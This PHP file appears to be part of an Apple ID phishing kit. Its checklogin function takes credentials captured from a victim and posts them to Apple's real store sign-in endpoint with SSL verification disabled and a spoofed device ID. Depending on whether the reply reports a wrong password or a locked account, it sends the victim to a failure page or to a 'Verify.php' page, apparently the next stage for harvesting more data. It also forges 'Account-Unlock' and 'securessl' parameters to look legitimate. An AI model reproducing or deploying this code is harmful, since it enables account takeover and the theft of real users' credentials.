<?
session_start();
function connectCurl($url)
{
	$ch = curl_init(); 
	$timeout = 5;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}
function postCurl($url,$postData)
{
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$postData);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$data = curl_exec ($ch);
	curl_close ($ch);
	return $data;
}
function checklogin($user, $pass, $to){
        $ch = curl_init();      
        curl_setopt($ch, CURLOPT_URL, "https://secure1.store.apple.com/us/sentryx/sign_in");
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "login-appleId=$user&login-password=$pass&deviceID=NDa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQBTuX38.WUMnGWVQdg1kzDlSgyyIT1nj.rIN4WzcjftckcKyAd65hz74WySXvOxwaw4a8vSPzIAQYzowRsb97FZ16XhayIz40DIAalnjjftckgweJhwAan0XrnE9XXTneNufuyPBDjaY2ftckuyPB884akHGOg41a3EN8_S1L1rJhCVW0VW_xGMuJjkWiK7.M_0p6RgDPYOe530Qs.BN.B975kFak3E90yZnxHfe2ReF.j9ffSX3NlY5p4fTCcvPUU0vp5bIs0UjLHi3qwkkxHxQNv__5BNlan0Os5Apw.9Dj&fdcBrowserData=%257B%2522U%2522%253A%2522Mozilla%252F5.0%2520(Windows%2520NT%25206.1%253B%2520rv%253A37.0)%2520Gecko%252F20100101%2520Firefox%252F37.0%2522%252C%2522L%2522%253A%2522en%2522%252C%2522Z%2522%253A%2522GMT%252B01%253A00%2522%252C%2522V%2522%253A%25221.0%2522%257D&_a=login.sign&c=aHR0cDovL3N0b3JlLmFwcGxlLmNvbS91c3wxYW9zZmU4OGZjNWIyNThhYWVhOTM5MzVjZjI2NTk1OGE3MWUwY2Y0MmI2OA&_fid=si&r=SCDHYHP7CY4H9XK2H&s=aHR0cDovL3N0b3JlLmFwcGxlLmNvbS91c3wxYW9zZmU4OGZjNWIyNThhYWVhOTM5MzVjZjI2NTk1OGE3MWUwY2Y0MmI2OA&t=S99KKATD9FP9FHCP4");
        curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
        $login = curl_exec($ch);
        $check = (eregi('incorrectly',$login)) ? true:false;
		$check2 = (eregi('locked',$login)) ? true:false;
        if($check == true){
              redirectTo("../../LoginFailed.php?" . $_SESSION['user']. "&Account-Unlock&sessionid=" . generateRandomString(115)."&securessl=true");
		}
	    elseif($check2 == true){
              redirectTo("../../LoginFailed.php?" . $_SESSION['user']. "&Account-Unlock&sessionid=" . generateRandomString(115)."&securessl=true");
        }else{     

			  redirectTo("../../Verify.php?" . $_SESSION['user']. "&Account-Unlock&sessionid=" . generateRandomString(115)."&securessl=true");
			  
        }
}            
?>
